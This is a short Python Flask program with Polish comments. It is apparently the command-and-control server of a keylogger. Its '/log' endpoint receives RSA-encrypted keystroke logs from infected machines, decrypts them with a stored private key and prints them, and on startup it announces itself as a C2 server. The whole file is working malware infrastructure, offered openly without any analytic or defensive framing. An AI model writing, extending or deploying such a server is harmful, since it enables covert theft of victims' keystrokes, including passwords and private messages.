from flask import Flask, request, abort
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

# Inicjalizacja aplikacji Flask
app = Flask(__name__)

def load_private_key():
    """Wczytuje klucz prywatny z pliku PEM."""
    with open("private_key.pem", "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None  # Jeśli klucz byłby zaszyfrowany hasłem
        )
    return private_key

# Wczytanie klucza prywatnego przy starcie serwera
PRIVATE_KEY = load_private_key()

def decrypt_data(encrypted_data: bytes) -> str:
    """Odszyfrowuje dane przy użyciu klucza prywatnego RSA."""
    decrypted = PRIVATE_KEY.decrypt(
        encrypted_data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return decrypted.decode('utf-8')

@app.route('/log', methods=['POST'])
def log_keystrokes():
    """Endpoint do odbierania i deszyfrowania danych."""
    if not request.data:
        abort(400, "Brak danych w żądaniu.")

    encrypted_data = request.data
    
    try:
        decrypted_log = decrypt_data(encrypted_data)
        print("--- Otrzymano nowy log ---")
        print(decrypted_log)
        print("--------------------------\n")
        return "Dane otrzymane i odszyfrowane.", 200
    except Exception as e:
        print(f"Błąd podczas deszyfrowania: {e}")
        return "Błąd deszyfrowania.", 500

if __name__ == '__main__':
    print("Serwer C2 uruchomiony. Oczekuje na logi...")
    app.run(host='0.0.0.0', port=5000, debug=False)